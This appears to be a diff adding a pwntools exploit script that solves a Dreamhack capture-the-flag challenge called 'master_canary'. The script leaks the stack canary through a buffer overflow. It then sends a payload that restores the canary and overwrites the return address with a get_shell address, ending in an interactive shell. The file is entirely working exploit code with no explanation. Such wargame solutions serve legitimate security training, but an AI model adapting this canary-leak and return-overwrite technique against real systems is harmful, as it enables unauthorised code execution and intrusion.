@@ -1,0 +1,52 @@
+from pwn import *
+
+r = remote("host1.dreamhack.games", 22195)
+# r = process("./master/master_canary")
+
+# canary leak
+buf    = 0x7ffff77eee40
+canary = 0x7ffff77ef728
+
+offset = canary - buf
+
+print(hex(offset))
+
+r.sendlineafter("> ", "1")
+r.sendlineafter("> ", "2")
+r.sendlineafter("Size: ", str(offset + 1))
+payload = "a" * (offset-1) + "b" + "c"
+r.recvuntil("Data: ")
+r.sendline(payload)
+r.recvuntil("b")
+
+
+canary = u64(r.recv(8)) - ord('c') 
+sleep(0.5)
+
+print(hex(canary))
+
+
+
+#read rbp - 0x30
+
+get_shell = 0x0000000000400a4a
+
+payload  = b""
+payload += b"a" * 0x28
+payload += p64(canary)
+payload += p64(1)
+payload += p64(get_shell)
+print(r.recv())
+
+sleep(0.5)
+
+r.sendlineafter("Exit\n> ", "3")
+sleep(0.5)
+
+r.sendlineafter("Leave comment: ", payload)
+
+r.interactive()
+
+
+
+
